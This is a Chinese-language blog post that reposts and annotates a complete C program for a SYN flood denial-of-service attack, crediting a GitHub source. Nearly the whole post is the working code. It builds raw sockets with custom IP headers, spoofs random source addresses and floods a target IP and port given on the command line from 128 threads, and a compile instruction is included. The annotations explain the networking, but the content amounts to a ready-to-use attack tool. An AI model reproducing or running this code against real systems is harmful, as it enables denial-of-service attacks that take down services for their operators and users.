---
title: C语言实现SYN Flood
date: 2018-09-26
tags: [C,网络]
---

内容: 非原创, 但是原作者写的太好了, 代码规范整洁, 条理清晰

<!-- more -->

# 前言

**首先明确强调, 代码不是我写的, [出处是这里](https://github.com/jiangeZh/SYN_Flood), 我只是阅读后觉得很好, 加上了自己的注释和解析**

**原作者的代码非常规范整洁, 调理非常清晰易懂, 膜拜膜拜**

# 结构概述

1. 接收传参IP/端口, 检查合法性
2. 生成raw socket, 设置IP_HDRINCL选项允许自定义报文头部
3. 构造IP层内容/TCP层内容(TCP层的flag置为syn)
4. 计算IP层/TCP层的checksum(利用伪造的源IP来计算)
5. 将IP层拼接TCP层通过raw socket发送
6. 开多线程重复4/5步骤

# 代码

我的注释是`//`  原作者注释大部分是`/**/`

```c
#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <time.h> 
#include <arpa/inet.h>

/* 最多线程数 */
#define MAXCHILD 128

/* 原始套接字 */
int sockfd;

/* 程序活动标志 */
//while这个值来判断要不要继续发包
//截获SIGINT信号就将该值改为0, 从而结束发包
//因为是多线程发包, 所以要这么来结束
static int alive = -1;

char dst_ip[20] = { 0 };
int dst_port;

//ip层的内容, 目的ip/源ip/ttl等
struct ip{
    unsigned char       hl;
    unsigned char       tos;
    unsigned short      total_len;
    unsigned short      id;
    unsigned short      frag_and_flags;
    unsigned char       ttl;
    unsigned char       proto;
    unsigned short      checksum;
    unsigned int        sourceIP;
    unsigned int        destIP;
};

//tcp层的内容, 源端口/目的端口/seq等
//最后发送的数据就是ip层拼接上tcp层
struct tcphdr{
    unsigned short      sport;
    unsigned short      dport;
    unsigned int        seq;
    unsigned int        ack;
    unsigned char       lenres;
    unsigned char       flag;
    unsigned short      win;
    unsigned short      sum;
    unsigned short      urp;
};

//tcp的伪头部, 这部分是网络本来就有的, 是用来检查该包是不是发给自己的
//后面会转换为checksum放到tcp层的checksum里, 不作为实际传输内容
//收方反checksum发现daddr是自己就准入了(具体操作不是反checksum, 不详述了, 意思懂就好)
struct pseudohdr
{
    unsigned int        saddr;
    unsigned int        daddr;
    char                zero;
    char                protocol;
    unsigned short      length;
};

/* CRC16校验 */
/* unsigned short inline */
//没什么好说的, 就是规定的checksum算法, 因为用了raw socket, 所以要自行checksum
//这里本来是个inline, 应该是为了加快计算速度, 但是不知道为啥一直爆undefined reference, 查了一会试了几次搞不定就删了, 删后可以跑
unsigned short checksum (unsigned short *buffer, unsigned short size)     
{  

    unsigned long cksum = 0;
    
    while(size>1){
        cksum += *buffer++;
        size  -= sizeof(unsigned short);
    }
    
    if(size){
        cksum += *(unsigned char *)buffer;
    }
    
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);     
    
    return((unsigned short )(~cksum));
}

/* 发送SYN包函数
 * 填写IP头部，TCP头部
 * TCP伪头部仅用于校验和的计算
 */
//初始化ip层/tcp层内容
//简单讲就是在ip层填源目的ip, 在tcp层填入源目的端口, 然后是其他详细选项
void init_header(struct ip *ip, struct tcphdr *tcp, struct pseudohdr *pseudoheader)
{
    int len = sizeof(struct ip) + sizeof(struct tcphdr);
    // IP头部数据初始化
    //header length
    ip->hl = (4<<4 | sizeof(struct ip)/sizeof(unsigned int));
    //type of service
    ip->tos = 0;
    ip->total_len = htons(len);
    ip->id = 1;
    ip->frag_and_flags = 0x40;
    //time to live
    ip->ttl = 255;
    ip->proto = IPPROTO_TCP;
    ip->checksum = 0;
    ip->sourceIP = 0;
    ip->destIP = inet_addr(dst_ip);

    // TCP头部数据初始化
    tcp->sport = htons( rand()%16383 + 49152 );
    tcp->dport = htons(dst_port);
    tcp->seq = htonl( rand()%90000000 + 2345 ); 
    tcp->ack = 0; 
    tcp->lenres = (sizeof(struct tcphdr)/4<<4|0);
    //tcp的flag共6个, 右边数第二个是syn, 所以也就是000010, 也就是0x02
    //SYN Flood的SYN就在这里了, 每次发的包都是syn包, 因为是raw socket, 所以回复不自动处理
    tcp->flag = 0x02;
    tcp->win = htons (2048);
    //后面填充
    tcp->sum = 0;
    tcp->urp = 0;

    //TCP伪头部
    //构造伪头部, 源目的ip填好, 后面会计算checksum填入tcp层的checksum值, 不直接传输
    pseudoheader->zero = 0;
    pseudoheader->protocol = IPPROTO_TCP;
    pseudoheader->length = htons(sizeof(struct tcphdr));
    pseudoheader->daddr = inet_addr(dst_ip);
    srand((unsigned) time(NULL));

}


/* 发送SYN包函数
 * 填写IP头部，TCP头部
 * TCP伪头部仅用于校验和的计算
 */
//主要函数, 构造包发送
void send_synflood(struct sockaddr_in *addr)
{ 
    char buf[100], sendbuf[100];
    int len;
    struct ip ip;           //IP头部
    struct tcphdr tcp;      //TCP头部
    struct pseudohdr pseudoheader;  //TCP伪头部

    len = sizeof(struct ip) + sizeof(struct tcphdr);
    
    /* 初始化头部信息 */
    init_header(&ip, &tcp, &pseudoheader);
    
    /* 处于活动状态时持续发送SYN包 */
    //SIGINT信号会将active改为0, 从而退出
    while(alive)
    {
        //伪造源ip
        ip.sourceIP = rand();

        //计算IP校验和
        bzero(buf, sizeof(buf));
        memcpy(buf , &ip, sizeof(struct ip));
        ip.checksum = checksum((u_short *) buf, sizeof(struct ip));

        pseudoheader.saddr = ip.sourceIP;

        //计算TCP校验和
        //这里的校验和用到了伪头部, 伪头部只在这里用到, 伪头部只在这里参与计算checksum, 而不是作为实际传输内容参与传输
        bzero(buf, sizeof(buf));
        memcpy(buf , &pseudoheader, sizeof(pseudoheader));
        memcpy(buf+sizeof(pseudoheader), &tcp, sizeof(struct tcphdr));
        tcp.sum = checksum((u_short *) buf, sizeof(pseudoheader)+sizeof(struct tcphdr));

        //sendbuf就是最后的传输内容
        bzero(sendbuf, sizeof(sendbuf));
        //可以看到最后的传输内容是ip层内容直接拼接上tcp层内容
        memcpy(sendbuf, &ip, sizeof(struct ip));
        memcpy(sendbuf+sizeof(struct ip), &tcp, sizeof(struct tcphdr));
        //传一个包打印一个.
        printf(".");
        //sockfd是socket描述符
        //sendbuf放要发送的数据, len是长度
        //0是个flag
        //addr放目的地
        //最后一个常被赋值为sizeof(struct sockaddr)
        if ( sendto(sockfd, sendbuf, len, 0, (struct sockaddr *) addr, sizeof(struct sockaddr)) < 0 )
        {
            perror("sendto()");
            pthread_exit("fail");
        }
        //sleep(1);
    }
}

/* 信号处理函数,设置退出变量alive */
//因为多线程SIGINT无法传到每个线程, 所以用这种方式关闭每个线程
void sig_int(int signo)
{
    alive = 0;
}

/* 主函数 */
int main(int argc, char *argv[])
{
    struct sockaddr_in addr;
    struct hostent * host = NULL;

    int on = 1;
    int i = 0;
    pthread_t pthread[MAXCHILD];
    int err = -1;

    alive = 1;
    /* 截取信号CTRL+C */
    signal(SIGINT, sig_int);

    /* 参数是否数量正确 */
    if(argc < 3)
    {
        printf("usage: syn <IPaddress> <Port>\n");
        exit(1);
    }

    strncpy( dst_ip, argv[1], 16 );
    // ascii to int
    dst_port = atoi( argv[2] );

    bzero(&addr, sizeof(addr));

    addr.sin_family = AF_INET;
    addr.sin_port = htons(dst_port);

    //inet_addr将点分十进制ip转为长整型
    //inet_addr函数失败时返回INADDR_NONE
    //这行就是检测ip合法不合法
    if(inet_addr(dst_ip) == INADDR_NONE)
    {
        /* 为DNS地址，查询并转换成IP地址 */
        //第一个参数要是一个域名或ip
        //返回hostent结构
        host = gethostbyname(argv[1]);
        //也就是既不是ip也不是合法域名
        if(host == NULL)
        {
            perror("gethostbyname()");
            exit(1);
        }
        //addr结构体前面传入了AF_INET和端口, 这里传入ip
        //addr.sin_addr是struct in_addr格式, 要自己强转
        //addr.sin_addr.s_addr是struct in_addr_t格式, inet_addr("1.1.1.1")就是返回这个格式
        addr.sin_addr = *((struct in_addr*)(host->h_addr));
        //inet_ntoa将十进制网络字节序转换为点分十进制IP格式的字符串
        strncpy( dst_ip, inet_ntoa(addr.sin_addr), 16 );
    }
    else
        addr.sin_addr.s_addr = inet_addr(dst_ip);

    if( dst_port < 0 || dst_port > 65535 )
    {
        printf("Port Error\n");
        exit(1);
    }

    printf("host ip=%s\n", inet_ntoa(addr.sin_addr));

    /* 建立原始socket */
    sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);   
    if (sockfd < 0)    
    {
        perror("socket()");
        exit(1);
    }
    /* 设置IP选项 */
    //设置sockfd这个socket, 协议层次是ip层, 设置这层的IP_HDRINCL选项, 置其值为on的值, 也就是1
    //设置这个选项作用是: 为0则ip头由内核自动填, 为1则表示数据包包含ip头, 即用户自定义ip头
    if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof (on)) < 0)
    {
        perror("setsockopt()");
        exit(1);
    }

    /* 将程序的权限修改为普通用户 */
    setuid(getpid());

    /* 建立多个线程协同工作 */
    for(i=0; i<MAXCHILD; i++)
    {
        err = pthread_create(&pthread[i], NULL, send_synflood, &addr);
        if(err != 0)
        {
            perror("pthread_create()");
            exit(1);
        }
    }

    /* 等待线程结束 */
    for(i=0; i<MAXCHILD; i++)
    {
        err = pthread_join(pthread[i], NULL);
        if(err != 0)
        {
            perror("pthread_join Error\n");
            exit(1);
        }
    }

    close(sockfd);

    return 0;
}
```

编译记得加`-lpthread`

# 参考资料

[再次强调, 原作者不是我的, 是这里](https://github.com/jiangeZh/SYN_Flood)

[pseudo header讲解](https://blog.csdn.net/liuxingen/article/details/45459313)

[struct tcphdr结构体](http://blog.sina.com.cn/s/blog_5ceeb9ea0100wy0h.html)

[sendto函数](https://blog.csdn.net/u014748120/article/details/79409441)

[百度百科-hostent](https://baike.baidu.com/item/hostent/3032167?fr=aladdin)

[gethostbyname](https://www.cnblogs.com/renzhuang/articles/6846319.html)

[原始套接字SOCK_RAW](https://www.cnblogs.com/aspirant/p/4084127.html)

[IPPROTO_TCP的用途简介](https://zhidao.baidu.com/question/1863657879814320107.html)

[setsockopt()函数功能介绍](https://www.cnblogs.com/eeexu123/p/5275783.html)

[原始套接字 IP_HDRINCL](https://blog.csdn.net/yanyiyyy/article/details/6566871)